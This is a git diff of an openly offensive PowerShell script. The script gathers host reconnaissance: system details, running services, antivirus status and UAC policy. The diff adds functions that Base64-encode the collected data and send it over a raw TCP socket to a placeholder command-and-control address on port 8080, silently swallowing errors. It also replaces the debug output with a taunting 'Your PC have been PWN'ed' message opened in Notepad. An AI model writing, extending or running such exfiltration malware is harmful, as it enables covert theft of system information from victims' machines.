@@ -3,11 +3,11 @@ function ShowAllInformation {
     [CmdletBinding()]
     param (
         [Parameter()]
-        [string[]]$info
+        [string]$info
     )
 
-    $info | Out-File "$(Get-Location)\recon_salida.txt"
-    Start-Process notepad.exe "$(Get-Location)\recon_salida.txt"
+    $info | Out-File "$(Get-Location)\IMPORTANT_MESSAGE.txt"
+    Start-Process notepad.exe "$(Get-Location)\IMPORTANT_MESSAGE.txt"
     
 }
 
@@ -307,6 +307,54 @@ function UACPolicy {
     
 }
 
+function ConvertToBase64 {
+    [CmdletBinding()]
+    param (
+        [Parameter()]
+        [string[]]$data
+    )
+
+    $joined = $data -join "`n"
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($joined)
+    return [Convert]::ToBase64String($bytes)
+    
+}
+
+function SendDataToC2 {
+    [CmdletBinding()]
+    param (
+        [Parameter()]
+        [string[]]$data
+    )
+
+    try {
+
+
+        $joined = $data -join ""
+        $encoded = $joined -replace '\+','%2B' -replace '/','%2F' -replace '=','%3D'
+
+        $client = New-Object System.Net.Sockets.TcpClient
+        $connectTask = $client.ConnectAsync("<IP>", 8080)
+
+        if (-not $connectTask.Wait(1000)) {
+            $client.Dispose()
+            # [!] Connection to C2 timed out
+            return
+        }
+
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.WriteLine($encoded)
+        $writer.Flush()
+        $writer.Close()
+        $client.Close()
+
+
+    } catch {}
+
+
+}
+
 # call for storing the information from function
 $info = @()
 $info = BasicReconInformation
@@ -321,5 +369,9 @@ $info += RunningServices
 $info += AntivirusInfo
 $info += UACPolicy
 
+
+$newinfo = ConvertToBase64 -data $info
+
+SendDataToC2 -data $newinfo
 # this is for debug
-ShowAllInformation -info $info
+ShowAllInformation -info "WOOPS!!!!!!!!`nYour PC have been PWN'ed..... :(`n`nSORRY!!!"
